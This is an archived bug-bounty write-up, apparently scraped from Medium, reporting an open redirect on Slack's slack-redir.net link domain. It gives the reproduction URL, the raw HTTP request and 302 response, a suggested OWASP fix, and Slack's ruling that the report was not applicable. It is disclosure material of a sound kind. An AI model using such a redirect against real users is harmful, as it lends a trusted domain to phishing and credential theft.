---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-02-16_open-redirect-in-slack.md
original_filename: 2019-02-16_open-redirect-in-slack.md
title: Open Redirect in SLACK
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 88186e4acbb9f506fd5b701a102a29889095f1e11e03f8ecbc1b86bde8e8ad9e
text_sha256: 69e2712d8e8a0a899c503555c74e8f242c69ef89053f5691aaeb401e43287813
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Open Redirect in SLACK

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-02-16_open-redirect-in-slack.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `88186e4acbb9f506fd5b701a102a29889095f1e11e03f8ecbc1b86bde8e8ad9e`
- Text SHA256: `69e2712d8e8a0a899c503555c74e8f242c69ef89053f5691aaeb401e43287813`


## Content

---
title: "Open Redirect in SLACK"
url: "https://medium.com/@abaykandotcom/open-redirect-in-slack-385eb34b7c5f"
authors: ["Mukhammad Akbar (@abaykandotcom)"]
programs: ["Slack"]
bugs: ["Open redirect"]
publication_date: "2019-02-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5410
scraped_via: "browseros"
---

# Open Redirect in SLACK

Open Redirect in SLACK
abay - Akbar Kustirama
Follow
1 min read
·
Feb 16, 2019

33

3

Slack software is cloud-based collaboration software. Originally founded in 2009 as a chat tool for a now-defunct gaming technology, Slack has gained currency among enterprises and is broadening into a collaboration platform with capabilities beyond just messaging.

Get abay - Akbar Kustirama’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I discovered an Open Redirect Vulnerability on slack-redir.net. Another low risk bug that i found xD

Press enter or click to view image in full size
Step to Reproduce
Go to https://slack-redir.net/link?url=https://abaykan.com/
This will redirect you automatically.
Request
GET /link?url=https://abaykan.com/ HTTP/1.1
Host: slack-redir.net
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ht;q=0.8,id;q=0.7,so;q=0.6,es;q=0.5
Response
HTTP/1.1 302 Found
Date: Fri, 15 Feb 2019 17:36:15 GMT
Server: Apache
Vary: Accept-Encoding
location: https://abaykan.com/
Content-Length: 0
Connection: close
Content-Type: text/html
X-Via: haproxy-www-ok5p

Unfortunately I got an error while trying to inject XSS.

Suggested Fix

https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md

Impact

The attacker can redirect the victim to the malicious site using legit slack-redir.net domain name, which can be the copy of the real site, asking for the user credentials.

But because of special conditions (security policy) from SLACK, this report is considered invalid (Not Applicable).
